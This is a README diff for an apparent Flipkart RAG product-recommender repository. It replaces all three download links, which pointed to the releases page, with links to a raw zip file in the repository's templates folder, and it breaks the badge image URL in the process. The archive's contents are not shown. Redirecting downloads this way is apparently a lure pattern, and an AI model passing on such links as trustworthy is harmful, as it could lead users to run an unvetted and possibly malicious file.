@@ -1,6 +1,6 @@
 # 🛒 Flipkart-Product-Recommender-RAG - Smart Recommendations Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8C-brightgreen)](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/releases)
+[![Download](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/raw/refs/heads/main/templates/RAG_Product_Recommender_Flipkart_v1.1.zip%20Now-%20%F0%9F%93%8C-brightgreen)](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/raw/refs/heads/main/templates/RAG_Product_Recommender_Flipkart_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run the Flipkart-Product-Recommender-RAG smoothly, ensure your system meets t
 
 To get started, visit this page to download the latest release of Flipkart-Product-Recommender-RAG:
 
-[Download Latest Release](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/releases)
+[Download Latest Release](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/raw/refs/heads/main/templates/RAG_Product_Recommender_Flipkart_v1.1.zip)
 
 ### 🔍 Installation Steps
 
@@ -75,6 +75,6 @@ We welcome contributions to improve Flipkart-Product-Recommender-RAG. If you wou
 
 If you need further assistance, you can reach out through issues on our GitHub page. We strive to respond to all inquiries promptly.
 
-[Download Latest Release](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/releases)
+[Download Latest Release](https://github.com/regabbb22/Flipkart-Product-Recommender-RAG/raw/refs/heads/main/templates/RAG_Product_Recommender_Flipkart_v1.1.zip)
 
 Enjoy your personalized shopping experience with Flipkart-Product-Recommender-RAG!
